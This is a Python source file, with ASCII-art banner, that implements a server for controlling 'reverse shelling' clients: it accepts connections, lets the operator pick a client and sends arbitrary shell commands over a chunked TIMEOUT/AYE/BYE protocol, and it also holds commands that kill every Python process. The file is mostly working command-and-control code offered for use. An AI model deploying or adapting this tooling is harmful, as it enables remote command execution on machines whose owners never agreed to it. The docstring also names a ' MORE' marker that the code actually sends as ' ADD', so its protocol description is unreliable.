"""

                               .,,uod8B8bou,,.
                      ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
                 ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
                 !...:!TVBBBRPFT||||||||||!!^^""'   ||||
                 !.......:!?|||||!!^^""'            ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 !.........||||                     ||||
                 `.........||||  ,                 ,||||
                  .;.......||||  ;..-         _.-!!|||||
           .,uodWBBBBb.....||||       _.-!!|||||||||!:'
        !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
        !`lYBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
        !. `lYBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
        ! `. `lYBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
        !`. `. `lYBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
        `. `. `. `lYBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
          `. `. `. `::::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
            `. `. `.:::::::::::::::::;iof688888888888888888888b.     `
              `. `. ::::::::::;iof688888888888888888888888888888b.
                `. `:::::;iof688888888888888888888888888888888899fT!
                  `.:::!8888888888888888888888888888888899fT|!^"'
                       !!988888888888888888888888899fT|!^"'
                        `!!8888888888888888899fT|!^"'
                          `!988888888899fT|!^"'
                            `!9899fT|!^"'
                              `!^"'


Standard library server for reverse shelling with Speedy-J2 clients

Drop into a shell with keyboardInterrupt:
        - Send everything after 'SEND '
        - Exit session with 'exit()'

        Messages are at most 1024 bytes they start with b'TIMEOUT 5' and
        end with  b' MORE', b' AYE'  or b' BYE':
        - b 'TIMEOUT {int}' signals how long you wish to wait on a reply ins seconds
          Commands that you do not expect to terminate MUST be ran in the background!
        - b' MORE' signals more will follow, bodies of these messages are concatenated
        - b' AYE' signals the end of a command, is executed by the client
        - b' BYE' signals client to close the session

        - Exit session with 'exit()'

When in a session with a client, no new connections are accepted.
If you need to interact with multiple clients concurrently, run more servers.
"""
from math import ceil
import subprocess
import selectors
import socket
import types
import time
import sys
import re

HOST = '127.0.0.1'
PORT = int(sys.argv[1])

sel = selectors.DefaultSelector()

# Listening socket, TCP, IPv4
lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((HOST, PORT))
lsock.listen()
print('listening on', (HOST, PORT))

# Set socket in non-blocking mode
lsock.setblocking(False)
# Register the socket to be monitored with sel.select() for read events
sel.register(lsock, selectors.EVENT_READ, data=None)

# Some commands:
parricide = f"kill -9 $(pgrep -f {sys.argv[0]})"
genocide = "for pid in $(pgrep -f python); do kill -9 $pid; done"
# TODO regicide


def subp_run(command):
    return subprocess.run(command, shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,
                          stdin=subprocess.PIPE,
                          timeout=None)


def accept_wrapper(sock):
    conn, addr = sock.accept()  # Ready to read
    print(f'Accepted client {addr}')
    conn.setblocking(False)
    data = types.SimpleNamespace(addr=addr, inb=b'', outb=b'')
    events = selectors.EVENT_READ | selectors.EVENT_WRITE
    sel.register(conn, events, data=data)


def test_connection(key, mask):
    sock = key.fileobj
    data = key.data
    if mask & selectors.EVENT_READ:  # Sock can be read
        recv_data = sock.recv(5)
        if recv_data:
            print(recv_data.decode())
            assert recv_data == b'Marco'
            data.outb += b'Polo'
        else:
            print("Received nothing from", data.addr)
            sel.unregister(sock)
            sock.close()
    if mask & selectors.EVENT_WRITE:
        if data.outb:

            sent = sock.send(data.outb)  # Returns the number of bytes sent
            data.outb = data.outb[sent:]


def session(s: socket):
    """
    :param s: A connected client
    """
    s.send(b'SHELL')  #

    while True:
        ui = input(f"{s.getpeername()[0]}: ")  # Loop until exit()

        if ui[:5] == 'SEND ':  # Prepare a command message
            if ui[5:12] != 'TIMEOUT':  # Timeout was not set by user
                body = ui[5:]
                packets = prepare_command(body)
            else:
                timeout = re.search(r'\d+', ui).group() # Search the first integer
                body = ui[12+len(timeout)+1:]  # 'SEND TIMEOUT len(int) '
                packets = prepare_command(body)

            for packet in packets:
                print(packet)
                s.send(packet)

        elif ui == 'exit()':
            s.send(b'TIMEOUT 0 exit 0 BYE')
            print("Laters")
            break


def prepare_command(message: str, timeout='5'):
    """
    Chop a message into chunks of max 1024 bytes incl. TIMEOUT and endings ADD/AYE
    """

    packets = []
    bodysize = 1024 - len(f'TIMEOUT {timeout} ') - len(' ADD')
    chunks = ceil(len(message) / bodysize)

    for chunk in range(0, chunks - 1):
        data = b'TIMEOUT ' + timeout.encode() + b' '
        data += message[:bodysize].encode()
        data += b' ADD'  # Signal more will follow
        message = message[bodysize:]
        packets.append(data)

    # Last chunk
    data = b'TIMEOUT ' + str(timeout).encode() + b' '
    data += message[:bodysize].encode()
    data += b' AYE'  # Signal end
    packets.append(data)

    return packets



# The event loop
while True:
    try:
        events = sel.select(timeout=None)  # blocks until there are sockets ready
        # It returns a k, v for each socket, key.fileobj contains the socket
        # If key.data is None we know its from the listening socket
        for key, mask in events:
            if key.data is None:
                accept_wrapper(key.fileobj)
            else:
                test_connection(key, mask)

    except KeyboardInterrupt as control_flow:

        print("\nAvailable clients: ")
        events = sel.select(timeout=-1)  # Not blocking, report all that are ready
        for i in range(len(events)):
            clientk, m = events[i]
            if clientk.data is not None:
                print(f'{i}' + ': ', clientk.data.addr, '\t')

        selected = int(input("Select a client to shell with: "))

        try:
            clientk = events[selected][0]
            print("Welcome to ", clientk.data.addr)
            sock = clientk.fileobj
            session(sock)
        except Exception as err:
            print(err)
            pass

        sp = subp_run(input("Now what"))
        sp.check_returncode()
        print(sp.stdout.decode('utf-8'))

        pass


#lsock.close()
#sys.exit(1)
